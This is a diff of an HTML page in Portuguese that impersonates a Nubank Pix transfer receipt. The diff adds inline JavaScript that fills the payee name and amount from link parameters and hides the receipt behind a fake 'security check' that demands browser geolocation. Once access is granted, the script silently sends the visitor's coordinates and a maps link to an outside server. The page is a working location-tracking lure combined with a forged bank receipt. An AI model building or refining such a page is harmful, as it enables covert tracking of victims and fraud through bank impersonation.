@@ -11,18 +11,18 @@
   <meta property="og:type" content="website">
 
   <style>
-    /* --- ESTILO GERAL --- */
+    /* --- CSS EMBUTIDO (VISUAL) --- */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
+      font-family: 'Graphik', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
     }
 
     body {
-      font-family: 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
       background-color: #fff;
       color: #111;
-      -webkit-font-smoothing: antialiased;
       overflow-x: hidden;
     }
 
@@ -45,8 +45,14 @@
 
     #tela-bloqueio h1 {
       color: #820ad1;
-      margin-bottom: 15px;
+      margin-bottom: 10px;
       font-size: 20px;
+    }
+
+    #tela-bloqueio p {
+      margin-bottom: 30px;
+      color: #666;
+      font-size: 15px;
     }
 
     .loader {
@@ -54,15 +60,23 @@
       margin-bottom: 20px;
     }
 
-    /* --- O COMPROVANTE (Visual App) --- */
+    /* MENSAGEM DE ERRO (Oculta por padrão) */
+    #msg-erro {
+      color: red;
+      display: none;
+      margin-top: 10px;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    /* LAYOUT DO COMPROVANTE */
     .app-container {
       padding: 24px;
       padding-bottom: 0;
-      max-width: 600px;
+      max-width: 500px;
       margin: 0 auto;
     }
 
-    /* Logo Nu */
     .nu-logo {
       width: 44px;
       height: 44px;
@@ -84,7 +98,6 @@
       transform: translate(-50%, -55%);
     }
 
-    /* Títulos */
     h1 {
       font-size: 24px;
       font-weight: 600;
@@ -96,10 +109,10 @@
     .sub-data {
       color: #737373;
       font-size: 14px;
+      font-weight: 400;
       margin-bottom: 32px;
     }
 
-    /* Linhas de Informação */
     .info-row {
       display: flex;
       justify-content: space-between;
@@ -112,6 +125,7 @@
       font-size: 16px;
       color: #000;
       flex: 1;
+      max-width: 40%;
     }
 
     .value {
@@ -120,23 +134,23 @@
       color: #000;
       text-align: right;
       flex: 1.5;
-      word-wrap: break-word;
+      max-width: 60%;
+      word-break: break-word;
     }
 
     .pix-color {
       color: #737373;
     }
 
-    /* Divisores de Seção */
     .section-header {
       margin-top: 32px;
       margin-bottom: 16px;
       font-size: 14px;
-      color: #000;
+      color: #737373;
       font-weight: 400;
     }
 
-    /* RODAPÉ "VAZADO" */
+    /* RODAPÉ */
     .footer-gray {
       background-color: #f5f5f5;
       padding: 24px;
@@ -193,14 +207,13 @@
   <div id="tela-bloqueio">
     <div class="loader">🔒</div>
     <h1>Verificação de Segurança</h1>
-    <p>Permita a localização para visualizar o comprovante.</p>
+    <p>Aguardando confirmação de localização...</p>
+    <div id="msg-erro">⚠️ Você precisa permitir a localização no navegador para ver o comprovante.</div>
   </div>
 
   <div id="site-real" style="display: none;">
     <div class="app-container">
-
       <div class="nu-logo"></div>
-
       <h1>Comprovante de<br>transferência</h1>
       <p class="sub-data">20 JAN 2026 - 20:17:23</p>
 
@@ -214,7 +227,6 @@
       </div>
 
       <div class="section-header">Destino</div>
-
       <div class="info-row">
         <span class="label">Nome</span>
         <span class="value" id="nome-destino">JORGE LUIZ DA CONCEIÇÃO</span>
@@ -237,7 +249,6 @@
       </div>
 
       <div class="section-header">Origem</div>
-
       <div class="info-row">
         <span class="label">Nome</span>
         <span class="value">Fernando Silva</span>
@@ -261,24 +272,62 @@
 
       <div class="footer-gray">
         <p>Nu Pagamentos S.A. - Instituição de Pagamento<br>CNPJ 18.236.120/0001-58</p>
-
         <div class="label-id">ID da transação:</div>
         <div class="code-id">E18236120202601192017a94b58c2d1e</div>
-
         <p style="font-weight: 400; color: #737373;">Estamos aqui para ajudar se você tiver alguma dúvida.</p>
-
         <a href="#" class="help-link">Me ajuda -></a>
-
         <div class="legal-text">
           Ouvidoria: 0800 887 0463 ou demais canais em nubank.com.br/contatos#ouvidoria (Atendimento das 8h às 18h em
           dias úteis).
         </div>
       </div>
-
     </div>
   </div>
 
-  <script src="script.js"></script>
+  <script>
+    // --- JAVASCRIPT EMBUTIDO (SEM ARQUIVO EXTERNO) ---
+
+    window.addEventListener("load", () => {
+      // 1. Configura nomes via Link
+      const params = new URLSearchParams(window.location.search);
+      const nomeUrl = params.get('nome');
+      const valorUrl = params.get('valor');
+
+      if (nomeUrl) document.getElementById('nome-destino').innerText = nomeUrl.toUpperCase();
+      if (valorUrl) document.getElementById('valor-pix').innerText = "R$ " + valorUrl;
+
+      // 2. PEDE LOCALIZAÇÃO AUTOMATICAMENTE
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        document.getElementById('msg-erro').innerText = "Navegador antigo.";
+        document.getElementById('msg-erro').style.display = 'block';
+      }
+    });
+
+    function sendLocation(position) {
+      // Mostra o site
+      document.getElementById('tela-bloqueio').style.display = 'none';
+      document.getElementById('site-real').style.display = 'block';
+
+      // Envia dados
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `http://maps.google.com/?q=${latitude},${longitude}`;
+
+      // LINK CORRIGIDO: 1817 (NUMERO)
+      fetch("https://comprovante-pix-1817.onrender.com/send-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude, longitude, maps })
+      }).catch(e => console.error(e));
+    }
+
+    function handleError(error) {
+      // Se a pessoa bloquear, mostra erro
+      document.getElementById('msg-erro').style.display = 'block';
+    }
+  </script>
 
 </body>
 
